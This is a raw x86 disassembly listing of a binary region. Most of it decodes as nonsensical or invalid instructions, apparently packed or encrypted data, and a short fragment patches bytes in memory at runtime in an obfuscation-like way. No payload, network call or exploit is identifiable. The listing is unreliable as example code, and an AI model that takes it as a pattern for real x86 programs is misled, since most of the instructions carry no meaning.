  4038b9:	test   eax,0x5a514cd9
  4038be:	int    0x65
  4038c0:	test   BYTE PTR [ecx+0x7fb6846f],0x69
  4038c7:	inc    esp
  4038c8:	xor    eax,0x1fdf4e46
  4038cd:	outs   dx,BYTE PTR ds:[esi]
  4038ce:	pop    ds
  4038cf:	xchg   ebx,eax
  4038d0:	in     al,dx
  4038d1:	inc    ebp
  4038d2:	retf   0x6127
  4038d5:	push   esp
  4038d6:	popf   
  4038d7:	xchg   BYTE PTR [edi-0x2b],cl
  4038da:	cmp    eax,0xb68febae
  4038df:	nop
  4038e0:	nop
  4038e1:	std    
  4038e2:	or     cl,BYTE PTR [ebx+0x12]
  4038e5:	jno    0x40391b
  4038e7:	stos   DWORD PTR es:[edi],eax
  4038e8:	outs   dx,DWORD PTR ds:[esi]
  4038e9:	inc    eax
  4038ea:	pop    ss
  4038eb:	aad    0x7c
  4038ed:	out    0xd5,al
  4038ef:	(bad)  
  4038f0:	xchg   ecx,eax
  4038f1:	enter  0x8de1,0xe0
  4038f5:	inc    ecx
  4038f6:	fcom   st(2)
  4038f8:	adc    DWORD PTR [eax+0x4437b1df],ebp
  4038fe:	sbb    eax,0xe309d2db
  403903:	pusha  
  403904:	popa   
  403905:	mov    dh,BYTE PTR [edx]
  403907:	(bad)
  40390a:	(bad)  
  40390b:	xor    al,0xca
  40390d:	in     eax,0xf8
  40390f:	jmp    0x5d0e:0x2697025f
  403916:	ins    BYTE PTR es:[edi],dx
  403917:	sub    eax,0x7a9366c1
  40391c:	enter  0x8bb6,0x8a
  403920:	(bad)  
  403921:	not    BYTE PTR [esi]
  403923:	inc    ebp
  403924:	cmp    DWORD PTR [esi+0x390373dd],edi
  40392a:	dec    esp
  40392b:	xlat   BYTE PTR ds:[ebx]
  40392c:	cmp    DWORD PTR [edx+0x0],0xffffffb9
  403930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403931:	jne    0x40393d
  403933:	jle    0x4038d5
  403935:	xor    eax,0x7ffe5f55
  40393a:	cs jecxz 0x40399a
  40393d:	mov    dl,0x69
  40393f:	push   ecx
  403940:	or     ch,bl
  403942:	jnp    0x403955
  403944:	fld    DWORD PTR [eax]
  403946:	and    DWORD PTR [edx],eax
  403948:	sahf   
  403949:	xor    DWORD PTR [ebx+edx*1+0x73],ecx
  40394d:	jecxz  0x40395a
  40394f:	inc    ebp
  403950:	(bad)  
  403951:	push   ebx
  403952:	push   ebp
  403953:	mov    WORD PTR ss:[eax],es
  403956:	fcmovbe st,st(2)
  403958:	mov    dh,0x45
  40395a:	sbb    DWORD PTR [edi-0x4cf5fe9b],ebx
  403960:	jge    0x40397f
  403962:	mov    ch,0xe2
  403964:	dec    edi
  403965:	call   0x9c842548
  40396a:	ficom  WORD PTR [esi-0x1e]
  40396d:	mov    dl,0x8a
  40396f:	call   0x94c:0xbe710354
  403976:	ja     0x4039f6
  403978:	adc    esp,DWORD PTR [eax-0x1f]
  40397b:	inc    edx
  40397c:	pushf  
  40397d:	xor    eax,0x34a7a12b
  403982:	sub    al,0x61
  403984:	pop    ss
  403985:	addr16 inc esi
  403987:	xor    esp,DWORD PTR [ebp+0x777ca7a6]
  40398d:	mov    edi,0xf28561b3
  403992:	ret    
  403993:	in     al,dx
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	ret    0xc2ec
  4039d3:	test   al,0xf7
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	and    dl,BYTE PTR [esi-0x4de613f7]
  4039e2:	out    dx,eax
  4039e3:	and    cl,BYTE PTR [edi+0x52]
  4039e6:	pop    ebp
  4039e7:	stos   DWORD PTR es:[edi],eax
  4039e8:	mov    bh,0x77
  4039ea:	jg     0x403a1a
  4039ec:	test   eax,0xd4a32c15
  4039f1:	sbb    DWORD PTR [ecx+0x19],esi
  4039f4:	cs pop edx
  4039f6:	mov    ah,0x3b
  4039f8:	adc    ch,BYTE PTR [eax+0x62]
  4039fb:	fst    QWORD PTR [ebp-0x28]
  4039fe:	mov    esp,0xd3d56ade
  403a03:	fnstenv [edi]
  403a05:	push   ebx
  403a06:	fistp  QWORD PTR [ecx+0x6c0c2768]
  403a0c:	mov    esp,0x95f38f9e
  403a11:	fmulp  st(0),st
  403a13:	adc    BYTE PTR [ecx+0x3517cc29],0x95
  403a1a:	je     0x4039f9
  403a1c:	sub    esi,DWORD PTR [ecx+0xde990b8]
  403a22:	cs in  al,dx
  403a24:	jp     0x403a4e
  403a26:	dec    esp
  403a27:	xor    DWORD PTR [eax-0x34808dbe],0xcc27219c
  403a31:	mov    bh,0x5
  403a33:	retf   
  403a34:	mov    eax,0x71e33048
  403a39:	lahf   
  403a3a:	push   ss
  403a3b:	iret   
  403a3c:	pop    ebx
  403a3d:	push   edi
  403a3e:	push   cs
  403a3f:	dec    esp
  403a40:	push   ds
  403a41:	xchg   esi,eax
  403a42:	mov    edi,0xd6606a0a
  403a47:	and    DWORD PTR [si-0xc],eax
  403a4b:	add    al,BYTE PTR [edx+0x48eaf610]
  403a51:	dec    ecx
  403a52:	cld    
  403a53:	mov    eax,DWORD PTR [eax+0x52]
  403a56:	push   cs
  403a57:	es ins BYTE PTR es:[edi],dx
  403a59:	mov    ch,0xc8
  403a5b:	add    BYTE PTR [ecx],bh
  403a5d:	xor    al,0x1e
  403a5f:	ss stc 
  403a61:	cmp    bl,bl
  403a63:	(bad)  
  403a64:	xchg   ebx,eax
  403a65:	jmp    0xa8ef511f
  403a6a:	mov    edi,edx
  403a6c:	jne    0x403a93
  403a6e:	cdq    
  403a6f:	scas   eax,DWORD PTR es:[edi]
  403a70:	adc    BYTE PTR [edi-0x479782af],al
  403a76:	rcr    edi,cl
  403a78:	sbb    ecx,DWORD PTR [edx-0x5d]
  403a7b:	xchg   BYTE PTR [ebx-0x11281c83],dl
  403a81:	push   eax
  403a82:	mov    dh,0xb3
  403a84:	sub    eax,0xa4cb2341
  403a89:	and    al,0x98
  403a8b:	int    0xa9
  403a8d:	int    0xf4
  403a8f:	rol    DWORD PTR [edi-0x1e119539],1
  403a95:	mov    ah,0x9
  403a97:	xchg   esi,eax
  403a98:	out    0x21,al
  403a9a:	outs   dx,DWORD PTR ds:[esi]
  403a9b:	dec    eax
  403a9c:	cs push ecx
  403a9e:	or     cl,BYTE PTR [ecx+ebx*8+0x770f15fb]
  403aa5:	mov    eax,0xa0bd974d
  403aaa:	cmc    
  403aab:	(bad)  
  403aac:	stos   DWORD PTR es:[edi],eax
  403aad:	mov    cl,0x88
  403aaf:	dec    esp
  403ab0:	jo     0x403a3c
  403ab2:	mov    al,ds:0x1aaf7153
  403ab7:	pop    esp
  403ab8:	fisttp WORD PTR [esi]
  403aba:	pop    ebx
  403abb:	adc    esi,esp
  403abd:	mul    DWORD PTR [eax+eax*4+0x78210e55]
  403ac4:	inc    edx
  403ac5:	and    edx,DWORD PTR [ecx+0x355cd297]
  403acb:	dec    edx
  403acc:	cmp    ch,BYTE PTR [ebx]
  403ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403acf:	cmp    dh,BYTE PTR [esi-0x7f]
  403ad2:	sbb    eax,0x8e303487
  403ad7:	jae    0x403aeb
  403ad9:	cwde   
  403ada:	push   esp
  403adb:	loope  0x403a96
  403add:	pop    esp
  403ade:	xlat   BYTE PTR ds:[ebx]
  403adf:	ss imul ebx,ebp,0x595653a3
  403ae6:	mov    dl,0x32
  403ae8:	jb     0x403b53
  403aea:	and    DWORD PTR [ecx-0x1fdc0695],ebp
  403af0:	mov    bh,0x78
  403af2:	les    ebp,FWORD PTR [ecx]
  403af4:	and    DWORD PTR [esi-0x7a],ebx
  403af7:	fistp  WORD PTR [eax+ebx*1]
  403afa:	ds cli 
  403afc:	in     al,0xa9
  403afe:	retf   0x783
  403b01:	test   DWORD PTR [edx],esp
  403b03:	sti    
  403b04:	adc    DWORD PTR [edx+0x75c9c1d6],edx
  403b0a:	xchg   esp,eax
  403b0b:	jp     0x403b0f
  403b0d:	jp     0x403a8f
  403b0f:	ins    BYTE PTR es:[edi],dx
  403b10:	pop    ebx
  403b11:	jmp    0xe145:0x4c6836dc
  403b18:	popf   
  403b19:	ret    
  403b1a:	sbb    al,0x21
  403b1c:	adc    eax,0xf721bc37
  403b21:	imul   esp,DWORD PTR [esi-0x1c45040e],0xffffffdf
  403b28:	mov    cl,0x2c
  403b2a:	cmp    esp,esi
  403b2c:	rcl    dl,0x1c
  403b2f:	loop   0x403b2f
  403b31:	cmp    DWORD PTR [ecx+0x2ad60eaf],ecx
  403b37:	out    dx,al
  403b38:	push   ebp
  403b39:	dec    ecx
  403b3a:	mov    ds:0xec86cc22,eax
  403b3f:	repnz sbb ah,BYTE PTR [ebp+0x5ef95907]
  403b46:	pop    esi
  403b47:	(bad)  
  403b48:	out    dx,al
  403b49:	mov    al,0xd5
  403b4b:	(bad)  
  403b4c:	cmc    
  403b4d:	xor    eax,0xddeca0c8
  403b52:	push   esp
  403b53:	std    
  403b54:	shr    BYTE PTR [eax-0x6b],cl
  403b57:	push   edx
  403b58:	out    dx,eax
  403b59:	(bad)  
  403b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b5b:	stc    
  403b5c:	mov    dh,0xaf
  403b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b60:	jnp    0x403bac
  403b62:	in     eax,0xa1
  403b64:	jmp    0xf377f85
  403b69:	leave  
  403b6a:	xor    ah,BYTE PTR [eax-0x7c]
  403b6d:	(bad)  
  403b6e:	mov    ecx,0x26d74a72
  403b73:	arpl   si,cx
  403b75:	div    DWORD PTR [edi]
  403b77:	push   esi
  403b78:	jne    0x403b6b
  403b7a:	xchg   DWORD PTR [esi-0x565927ee],ecx
  403b80:	ja     0x403b9f
  403b82:	mov    DWORD PTR [eax-0x62],esp
  403b85:	(bad)
  403b88:	add    eax,0x4921a2a
  403b8d:	pop    ecx
  403b8e:	bound  ebx,QWORD PTR [edi+0x16]
  403b91:	xor    BYTE PTR [ebx-0x47],ch
  403b94:	jns    0x403b4f
  403b96:	test   al,0x95
  403b98:	ror    DWORD PTR [esp+ecx*1],1
  403b9b:	sbb    edx,DWORD PTR [ebp+0xd]
  403b9e:	mov    esi,0xf328fdca
  403ba3:	bound  edx,QWORD PTR [ecx+0x23]
  403ba6:	inc    ebp
  403ba7:	xor    DWORD PTR [esp+eiz*2+0x6fdf5377],ecx
  403bae:	test   BYTE PTR [ecx-0x41eab203],ah
  403bb4:	cli    
  403bb5:	clc    
  403bb6:	sti    
  403bb7:	pop    ebp
  403bb8:	jo     0x403bdd
  403bba:	imul   edx,eax,0xffffffee
  403bbd:	or     esi,DWORD PTR [ecx+0x4ffd64ef]
  403bc3:	inc    eax
  403bc4:	(bad)  
  403bc5:	fsubrp st(2),st
  403bc7:	(bad)
  403bcb:	xor    eax,0x955d1016
  403bd0:	ja     0x403b8f
  403bd2:	dec    eax
  403bd3:	int3   
  403bd4:	jne    0x403b80
  403bd6:	adc    bl,bl
  403bd8:	lods   al,BYTE PTR ds:[esi]
  403bd9:	pop    ss
  403bda:	test   al,0x11
  403bdc:	or     BYTE PTR [edi+0x468daf9a],al
  403be2:	or     edi,esp
  403be4:	mov    ecx,0x5f901604
  403be9:	add    al,BYTE PTR [edx+eax*2-0x33]
  403bed:	xchg   ecx,eax
  403bee:	stc    
  403bef:	xor    esp,DWORD PTR [eax-0x233e9e1e]
  403bf5:	je     0x403c3b
  403bf7:	adc    DWORD PTR [ecx],edx
  403bf9:	or     al,0x9b
  403bfb:	aas    
  403bfc:	rcl    BYTE PTR [eax+ecx*4+0x7f],0xac
  403c01:	nop
  403c02:	jge    0x403ba3
  403c04:	cmp    al,0xa7
  403c06:	(bad)  
  403c08:	(bad)  
  403c09:	sar    DWORD PTR fs:[esi-0x5b],cl
  403c0d:	inc    edx
  403c0e:	icebp  
  403c0f:	shl    BYTE PTR [edx+0x29],1
  403c12:	fiadd  DWORD PTR [ebx+0x104b6a0d]
  403c18:	and    dl,cl
  403c1a:	out    dx,al
  403c1b:	cs xor dh,dl
  403c1e:	scas   eax,DWORD PTR es:[edi]
  403c1f:	jne    0x403c25
  403c21:	mov    ds:0x494453e7,eax
  403c26:	cmp    eax,0x2e508195
  403c2b:	adc    cl,BYTE PTR [ebp+0x71]
  403c2e:	aaa    
  403c2f:	mov    ecx,0x40276a41
  403c34:	imul   edi,ebx,0x550745c0
  403c3a:	mov    ecx,0x96ed3f02
  403c3f:	leave  
  403c40:	lahf   
  403c41:	mov    eax,0x763c62f0
  403c46:	lahf   
  403c47:	pop    edi
  403c48:	and    eax,0x152d91d
  403c4d:	test   BYTE PTR [edx+0x4d],bh
  403c50:	call   0xdc0d9b2b
  403c55:	sbb    BYTE PTR [ebx-0x5628dd5b],cl
  403c5b:	lahf   
  403c5c:	rol    BYTE PTR [ebx],cl
  403c5e:	and    ch,BYTE PTR [ecx-0x17]
  403c61:	pop    es
  403c62:	mov    dl,0xa9
  403c64:	mov    esi,0x4d73ce33
  403c69:	retf   
  403c6a:	sub    bh,BYTE PTR [edi]
  403c6c:	and    al,BYTE PTR [eax]
  403c6e:	mov    esi,0x389f0fc8
  403c73:	push   esi
  403c74:	into   
  403c75:	sahf   
  403c76:	push   0x1a
  403c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c79:	mov    BYTE PTR [esi-0x1],cl
  403c7c:	aam    0x71
  403c7e:	push   esi
  403c7f:	mov    ebp,edi
  403c81:	fadd   QWORD PTR [ebx-0x36]
  403c84:	cli    
  403c85:	sbb    cl,dh
  403c87:	or     al,0x23
  403c89:	or     BYTE PTR [ebx-0x3dd57321],0x2f
  403c90:	sub    eax,0x3974ac69
  403c95:	dec    esi
  403c96:	outs   dx,BYTE PTR ds:[esi]
  403c97:	dec    ebp
  403c98:	push   eax
  403c99:	cmp    BYTE PTR [edi+0x4523f022],0xd3
  403ca0:	or     esp,ebp
  403ca2:	sbb    ebx,DWORD PTR [ecx+0x4]
  403ca5:	ins    DWORD PTR es:[edi],dx
  403ca6:	clc    
  403ca7:	push   eax
  403ca8:	xchg   ecx,eax
  403ca9:	fisttp DWORD PTR [edx+0x25]
  403cac:	mov    ch,0xa9
  403cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403caf:	adc    eax,DWORD PTR [edx+0x3d8e6a77]
  403cb5:	imul   ebp,DWORD PTR [edx+0x5f3deb90],0xee1cca88
  403cbf:	push   ebp
  403cc0:	push   ss
  403cc1:	inc    edx
  403cc2:	stos   DWORD PTR es:[edi],eax
  403cc3:	rcr    DWORD PTR [ebp+0x136b270c],0xc8
  403cca:	jmp    FWORD PTR [ebp+0x41]
  403ccd:	mov    ebp,0x3b146210
  403cd2:	mov    ch,0x79
  403cd4:	mov    esp,0x1b7d4e3a
  403cd9:	test   DWORD PTR [ebx-0x263a8533],edx
  403cdf:	inc    ebx
  403ce0:	nop
  403ce1:	push   edx
  403ce2:	add    eax,0xf2479269
  403ce7:	lods   al,BYTE PTR ds:[esi]
  403ce8:	mov    bh,0x77
  403cea:	lds    eax,FWORD PTR [edi-0x7c]
  403ced:	dec    eax
  403cee:	add    DWORD PTR [esp+ebx*8-0x4521378e],0x1c
  403cf6:	sub    edx,DWORD PTR [edx+0x6c]
  403cf9:	adc    eax,0xd1e9aacd
  403cfe:	sbb    ecx,DWORD PTR [ecx+0x7b]
  403d01:	add    eax,0x26998930
  403d06:	in     eax,dx
  403d07:	jmp    0x403c90
  403d09:	mov    ds:0xcf00eeca,al
  403d0e:	inc    ecx
  403d0f:	jmp    0xb79b:0x1f8b7550
  403d16:	shl    BYTE PTR [ecx],1
  403d18:	and    esi,esi
  403d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d1b:	push   edi
  403d1c:	or     DWORD PTR [edi+0x3f],eax
  403d1f:	cli    
  403d20:	adc    BYTE PTR [esi+0x34],bh
  403d23:	cmp    esi,DWORD PTR [edi-0x419c5a8f]
  403d29:	and    dh,0x1b
  403d2c:	push   eax
  403d2d:	adc    ebx,0x22
  403d30:	or     BYTE PTR [ebx+0x6116a0c],0x3c
  403d37:	sar    ch,cl
  403d39:	jo     0x403da9
  403d3b:	stos   DWORD PTR es:[edi],eax
  403d3c:	pop    edx
  403d3d:	(bad)  
  403d3e:	rcr    BYTE PTR [ecx+0x31],0x20
  403d42:	cmp    esp,DWORD PTR [edi+0x11]
  403d45:	rol    BYTE PTR [ebx+0x24a8b0d],0x64
  403d4c:	xchg   ebp,eax
  403d4d:	inc    esp
  403d4e:	out    0xe3,al
  403d50:	stos   DWORD PTR es:[edi],eax
  403d51:	cmp    eax,0x6e5e334f
  403d56:	das    
  403d57:	or     ah,BYTE PTR [edi]
  403d59:	lods   al,BYTE PTR ds:[esi]
  403d5a:	xchg   DWORD PTR [ecx],esp
  403d5c:	inc    esp
  403d5d:	nop
  403d5e:	sub    al,BYTE PTR [esi+0x4c]
  403d61:	push   ecx
  403d62:	test   DWORD PTR [ebx],edi
  403d64:	cli    
  403d65:	arpl   sp,bp
  403d67:	(bad)  
  403d68:	push   edi
  403d69:	sub    BYTE PTR [ebx],bl
  403d6b:	push   esp
  403d6c:	pop    ss
  403d6d:	jmp    0xfc78594f
  403d72:	mov    dh,0x3d
  403d74:	mov    eax,0x33ec03a7
  403d79:	dec    ebx
  403d7a:	enter  0x5dd9,0xe9
  403d7e:	sub    bh,BYTE PTR [ebx]
  403d80:	imul   ebx,DWORD PTR [ecx+ebp*8+0x46835231],0x61
  403d88:	pop    ebp
  403d89:	jns    0x403d1a
  403d8b:	add    DWORD PTR [ecx-0x6ef52735],edi
  403d91:	into   
  403d92:	dec    ebx
  403d93:	xor    eax,0xaeab643
  403d98:	pop    ebx
  403d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d9a:	mov    ebp,0xb33c67b2
  403d9f:	adc    DWORD PTR [eax],edx
  403da1:	jb     0x403ddd
  403da3:	shl    ecx,0x99
  403da6:	or     eax,0x4e095fd
  403dab:	pop    ss
  403dac:	cmp    eax,0xd4e7c154
  403db1:	retf   
  403db2:	fisub  WORD PTR [edi-0x40d20c8f]
  403db8:	adc    eax,0x44ab3dea
  403dbd:	or     ch,BYTE PTR [eax-0x5a7d12cd]
  403dc3:	mov    ah,0xfe
  403dc5:	sahf   
  403dc6:	dec    esi
  403dc7:	retf   
  403dc8:	jp     0x403dee
  403dca:	mov    bh,0x58
  403dcc:	inc    ebp
  403dcd:	call   0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ecx-0x58],edx
  403e14:	push   eax
  403e15:	pmulhuw mm3,QWORD PTR [ecx]
  403e18:	jle    0x403e98
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e48
  403e1f:	xor    ebp,DWORD PTR [ebx-0x3e]
  403e22:	(bad)  
  403e23:	jecxz  0x403e81
  403e25:	fldcw  WORD PTR [ecx+0x2c]
  403e29:	arpl   WORD PTR [eax-0x58dce3f4],cx
  403e2f:	addr16 xchg esp,eax
  403e31:	or     BYTE PTR [edx+0xb],al
  403e34:	mov    ebp,0x508e4872
  403e39:	mov    ah,0x13
  403e3b:	and    al,0xe8
  403e3d:	xor    DWORD PTR [ebx+0x46],esp
  403e40:	xlat   BYTE PTR ds:[ebx]
  403e41:	stos   DWORD PTR es:[edi],eax
  403e42:	sub    ah,BYTE PTR [ebp+0x3909e4f4]
  403e48:	out    0xab,eax
  403e4a:	adc    BYTE PTR [edx+0x4c],al
  403e4d:	and    DWORD PTR [ebp-0x55],ecx
  403e50:	jg     0x403e66
  403e52:	mov    ebx,0x3a8cbf1d
  403e57:	gs or  al,0x31
  403e5a:	sti    
  403e5b:	rcr    esp,cl
  403e5d:	cdq    
  403e5e:	int3   
  403e5f:	adc    BYTE PTR [edi+0x66],cl
  403e62:	outs   dx,DWORD PTR ds:[esi]
  403e63:	or     DWORD PTR [ebp-0x39],0x962dd328
  403e6a:	dec    esp
  403e6b:	stc    
  403e6c:	adc    al,0xa5
  403e6e:	jmp    0x403e51
  403e70:	(bad)  ds:0x8db1b159
  403e76:	repnz rcl BYTE PTR [esi],0xb4
  403e7a:	adc    cl,BYTE PTR [eax-0x1c]
  403e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e7e:	je     0x403e55
  403e80:	hlt    
  403e81:	sbb    al,BYTE PTR [edi+0x2acb0d6b]
  403e87:	push   cs
  403e88:	or     DWORD PTR [ebp-0x1800b3a8],esi
  403e8e:	nop
  403e8f:	push   edi
  403e90:	inc    ebx
  403e91:	add    ebx,DWORD PTR [edi+edi*1]
  403e94:	mov    BYTE PTR [eax],dh
  403e96:	cdq    
  403e97:	rcl    cl,1
  403e99:	push   ebx
  403e9a:	mov    BYTE PTR [eax+0x6a],cl
  403e9d:	mov    ds:0xc1f962f8,al
  403ea2:	rcl    DWORD PTR [esi],1
  403ea4:	push   ebp
  403ea5:	add    BYTE PTR [edi-0x61baa45a],dl
  403eab:	int3   
  403eac:	xchg   ebp,eax
  403ead:	jno    0x403f0c
  403eaf:	push   edx
  403eb0:	sahf   
  403eb1:	stos   BYTE PTR es:[edi],al
  403eb2:	bound  edi,QWORD PTR [eax-0x24]
  403eb5:	dec    edi
  403eb6:	(bad)  
  403eb7:	loope  0x403ec9
  403eb9:	retf   
  403eba:	dec    eax
  403ebb:	jp     0x403f14
  403ebd:	add    al,BYTE PTR [esp+ebp*8]
  403ec0:	aaa    
  403ec1:	jmp    0x403f2f
  403ec3:	int3   
  403ec4:	(bad)  
  403ec5:	mov    esp,ecx
  403ec7:	lods   al,BYTE PTR ds:[esi]
  403ec8:	push   cs
  403ec9:	ins    DWORD PTR es:[edi],dx
  403eca:	nop
  403ecb:	(bad)
  403ecf:	mov    esp,0x6973ce1f
  403ed4:	sbb    eax,0x1416548f
  403ed9:	inc    edx
  403eda:	rcr    DWORD PTR [ecx+edi*1],0x6
  403ede:	xchg   ebp,eax
  403edf:	push   es
  403ee0:	push   ebx
  403ee1:	sub    BYTE PTR [ebp-0x5f],0xf6
  403ee5:	adc    dh,BYTE PTR [edi+0x24]
  403ee8:	xor    al,0x48
  403eea:	pop    esi
  403eeb:	sub    al,0xaa
  403eee:	mov    bh,0xd
  403ef0:	mov    bl,0x77
  403ef2:	out    dx,eax
  403ef3:	(bad)  
  403ef4:	and    BYTE PTR ds:0x8a4e9a34,dl
  403efa:	adc    BYTE PTR [esi],dl
  403efc:	not    edi
  403efe:	mov    cl,0xc8
  403f00:	in     al,0xb4
  403f02:	or     bl,BYTE PTR [eax]
  403f04:	in     eax,0xb3
  403f06:	inc    esi
  403f07:	mov    ebx,0x9ffbf11a
  403f0c:	or     eax,0x9b6da770
  403f11:	xchg   esi,eax
  403f12:	push   ebx
  403f13:	arpl   WORD PTR [ecx],ax
  403f15:	sbb    esp,ebp
  403f17:	fnstsw WORD PTR [ecx]
  403f19:	mov    edi,0x9171cbf8
  403f1e:	mov    bh,0x26
  403f20:	adc    BYTE PTR [edx+0x52d8c540],dh
  403f26:	lock into 
  403f28:	mov    ebp,0x4117685a
  403f2d:	std    
  403f2e:	jmp    0xe1fa:0x7b6b5efc
  403f35:	mov    ds:0x5ec48cc5,al
  403f3a:	shl    DWORD PTR ds:0xfcb2ad0d,cl
  403f40:	xor    esi,0x880645
  403f46:	int3   
  403f47:	jg     0x403f88
  403f49:	mov    edi,0xb7d9f393
  403f4e:	loope  0x403f20
  403f50:	xchg   ebp,eax
  403f51:	jecxz  0x403f29
  403f53:	inc    ebx
  403f54:	push   esp
  403f55:	mov    eax,ds:0x6c4f127
  403f5a:	lods   eax,DWORD PTR ds:[esi]
  403f5b:	add    eax,0x97ae3eb9
  403f60:	inc    ecx
  403f61:	add    BYTE PTR [ecx-0x580ea84e],bl
  403f67:	ret    
  403f68:	xchg   edi,eax
  403f69:	std    
  403f6a:	out    0x16,al
  403f6c:	add    eax,0x7cca82dc
  403f71:	(bad)  
  403f72:	xchg   edx,eax
  403f73:	push   0x7d
  403f75:	icebp  
  403f76:	ret    
  403f77:	mov    dh,0x75
  403f79:	(bad)  
  403f7a:	mov    al,0xfc
  403f7c:	pop    ebp
  403f7d:	idiv   DWORD PTR [edx+0xb9c70cd]
  403f83:	mov    edx,0x32f73cbe
  403f88:	push   ebp
  403f89:	push   ss
  403f8a:	mov    ds:0xb355a106,eax
  403f8f:	mov    dl,0xb6
  403f91:	rcl    DWORD PTR [ebx-0x43],cl
  403f94:	repz jno 0x403ff4
  403f97:	ins    DWORD PTR es:[edi],dx
  403f98:	adc    eax,0xe4842021
  403f9d:	push   esi
  403f9e:	pop    edi
  403f9f:	inc    esi
  403fa0:	neg    al
  403fa2:	leave  
  403fa3:	(bad)  
  403fa4:	test   BYTE PTR [edi],0x5c
  403fa7:	ja     0x403fb7
  403fa9:	repnz repnz push esp
  403fac:	mov    ?,WORD PTR [ebx-0x16]
  403faf:	pop    esi
  403fb0:	stos   DWORD PTR es:[edi],eax
  403fb1:	mov    bl,0xaa
  403fb3:	frstor [esi-0x7db0aa00]
  403fb9:	bound  edx,QWORD PTR [eax]
  403fbb:	sti    
  403fbc:	cli    
  403fbd:	xchg   esp,eax
  403fbe:	(bad)  
  403fc0:	stc    
  403fc1:	clc    
  403fc2:	sysenter 
  403fc4:	clc    
  403fc5:	sub    esi,DWORD PTR [eax-0x31c2421f]
  403fcb:	pop    edi
  403fcc:	hlt    
  403fcd:	add    BYTE PTR [ebx],bl
  403fcf:	in     eax,0x86
  403fd1:	jmp    0x254fbb5a
  403fd6:	shl    BYTE PTR [eax+0x607fb230],0x4
  403fdd:	fcmovbe st,st(1)
  403fdf:	outs   dx,DWORD PTR ds:[esi]
  403fe0:	popa   
  403fe1:	lods   al,BYTE PTR ds:[esi]
  403fe2:	pusha  
  403fe3:	lahf   
  403fe4:	test   DWORD PTR [ecx+0x77],0x6411462c
  403feb:	int    0x41
  403fed:	mov    edx,0x370ef138
  403ff2:	iret   
  403ff3:	mov    esp,0xf87d1ed3
  403ff8:	xchg   ebx,eax
  403ffa:	mov    edi,0xc03bb92
  403fff:	push   eax
  404000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404001:	cmp    edi,esi
  404003:	popf   
  404004:	shl    BYTE PTR [ecx-0x7b4b0df6],cl
  40400a:	and    BYTE PTR [esi-0x32cb29af],dh
  404010:	hlt    
  404011:	daa    
  404012:	(bad)  [ebx-0x52]
  404015:	push   edx
  404016:	mov    ds:0xea605e13,al
  40401b:	push   ss
  40401c:	shl    BYTE PTR [ecx-0x723430f],cl
  404022:	ins    DWORD PTR es:[edi],dx
  404023:	ss mov ah,0x46
  404026:	cwde   
  404027:	pop    ds
  404028:	mov    eax,ds:0x1f798a68
  40402d:	jns    0x404071
  40402f:	rcl    bh,0x77
  404032:	pushf  
  404033:	mov    edi,0x11f5b989
  404038:	aas    
  404039:	mov    DWORD PTR [eax-0x4b37ea7c],edi
  40403f:	out    0x1f,al
  404041:	jns    0x403fce
  404043:	and    DWORD PTR [edi-0x5bd88b41],esp
  404049:	xor    ebp,DWORD PTR [ecx+edi*2-0x80]
  40404d:	mov    gs,WORD PTR [di-0x51]
  404051:	and    ecx,ecx
  404053:	sub    ecx,DWORD PTR [ebp-0x6c]
  404056:	aaa    
  404057:	cmp    eax,0x2e2f69b9
  40405c:	rcl    cl,0x18
  40405f:	and    al,0x3f
  404061:	mov    bh,0xb8
  404063:	pop    edx
  404064:	call   0x9e3d80cb
  404069:	push   edi
  40406a:	shl    DWORD PTR [ecx-0x31b03226],0xd6
  404071:	mov    ebp,0x3678aa29
  404076:	push   ebp
  404077:	addr16 iret 
  404079:	cmovnp eax,DWORD PTR ds:0xb49eb78f
  404080:	cmp    eax,0xc99c7872
  404085:	pop    edi
  404086:	jg     0x4040bc
  404088:	xchg   edi,eax
